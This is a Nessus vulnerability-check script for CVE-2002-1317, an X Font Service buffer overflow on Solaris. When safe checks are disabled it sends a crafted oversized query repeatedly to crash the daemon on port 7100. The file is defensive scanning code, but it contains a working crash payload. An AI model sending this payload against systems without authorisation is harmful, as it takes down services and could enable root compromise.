#
# (C) Tenable Network Security, Inc.
#

# It turns out the initial revision of this script would *not* crash
# all versions of the font service.

include("compat.inc");

if(description)
{
 script_id(11188);
 script_version ("$Revision: 1.14 $");

 script_cve_id("CVE-2002-1317");
 script_bugtraq_id(6241);
 script_xref(name:"IAVA", value:"2002-t-0017"); 
 script_xref(name:"OSVDB", value:"15140");

 script_name(english:"X Font Service Crafted XFS Query Remote Overflow");
 script_summary(english:"Crashes the remote XFS daemon");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote font service is affected by a buffer overflow."
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "The remote X Font Service (xfs) is affected by a buffer overflow.\n",
   "\n",
   "An attacker may use this flaw to gain shell access on the remote host\n",
   "as 'root' or 'nobody'."
  )
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://www.cert.org/advisories/CA-2002-34.html"
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://www.nessus.org/u?01026fdd"
 );
 script_set_attribute(
  attribute:"solution", 
  value:string(
   "Apply the appropriate vendor patch as referenced in CERT Advisory\n",
   "CA-2002-34."
  )
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();
 
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely"); 
 script_require_ports(7100);
 if ( defined_func("bn_random") )
 	script_dependencie("solaris26_108129.nasl", "solaris26_x86_108130.nasl", "solaris7_108117.nasl", "solaris7_x86_108118.nasl");
 exit(0);
}


include("misc_func.inc");
include("solaris.inc");
include("global_settings.inc");

if ( get_kb_item("BID-6241") ) exit(0);
version = get_kb_item("Host/Solaris/Version");
if ( version && "5.10" >< version ) exit(0);

if ( version && ereg(pattern:"^5\.[89]", string:version) ) 
{
 if ( solaris_check_patch(release:"5.8_x86", arch:"intel", patch:"109863-03") >= 0 ||
      solaris_check_patch(release:"5.8", arch:"sparc", patch:"109862-03") >= 0 ||
      solaris_check_patch(release:"5.9", arch:"sparc", patch:"113923-02") >= 0 ||
      solaris_check_patch(release:"5.9_x86", arch:"intel", patch:"113924-02") >= 0)
	exit(0);
	
}

kb = known_service(port:7100);
if(kb && kb != "xfs")exit(0);


port = 7100;

if(safe_checks())
{
 if (report_paranoia < 2) exit(0);	# No FP
 if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  { 
   close(soc);
   report = string(
    "Note that Nessus has not tried to exploit the overflow because safe\n",
    "checks are enabled but instead has only determined that an X Font\n",
    "Service is running."
   );
   security_hole(port:port, extra:report);
  }
 }
 exit(0);
}


# Safe checks are disabled - let's be nasty.

req = string("B", raw_string(0x00, 0x02), crap(1024));

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 close(soc);
 
 # We might need to re-try the attack up to ten times
 
  for(i = 0 ; i < 10 ; i = i + 1)
  {
  soc = open_sock_tcp(port);
  if(soc)
  { 
  send(socket:soc, data:req);
  close(soc);
  } else { security_hole(port); exit(0); }
 }
}
